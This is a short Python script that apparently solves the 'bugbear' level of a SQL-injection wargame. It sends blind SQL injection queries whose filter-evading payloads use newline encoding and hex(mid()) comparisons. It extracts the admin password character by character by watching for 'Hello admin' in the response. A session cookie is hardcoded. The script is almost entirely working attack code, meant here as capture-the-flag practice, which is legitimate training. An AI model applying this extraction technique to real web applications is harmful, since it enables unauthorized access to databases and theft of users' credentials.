import requests

url = 'https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php'
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
cookies={'PHPSESSID':'f5p0a683aehdana6nepmqcrgbi'}
length = 8
flag=""
#" " -> %0a    & -> %26(url encoding)
"""
while 1:
   
    params = {'pw': "123",'no' : '1 || id in ("admin") && length(pw) in (8)'}
    response = requests.get(url, headers=headers, cookies=cookies, params=params)
    status_code = response.status_code
    html_data = response.text
    print(response.url)
    if(html_data.find("Hello admin") != -1):
        print "Hello admin"
        length -= 1
        print "length = "+str(length)
        break
    else:
        length+=1
"""
for i in range(1,length+1):
    for j in range(33,127):
        # no=1 || id in ("admin") && hex(mid(pw,1,1)) in (hex(55))
        url="https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
        query='?no=1%0a||%0aid%0ain%0a("admin")%0a%26%26%0ahex(mid(pw,'+str(i)+',1))%0ain%0a(hex('+str(j)+'))'
        url= url+query
        #params = {'pw':'123','no':'-1 id in "admin" && hex(mid(pw,'+str(i)+',1)) in hex('+str(j)+')'}
        response = requests.get(url, headers=headers, cookies=cookies)
        status_code = response.status_code
        html_data = response.text
        print(response.url)
        if (html_data.find("Hello admin") != -1):
            print "Hello admin"
            flag+=chr(j)
            print flag
            break
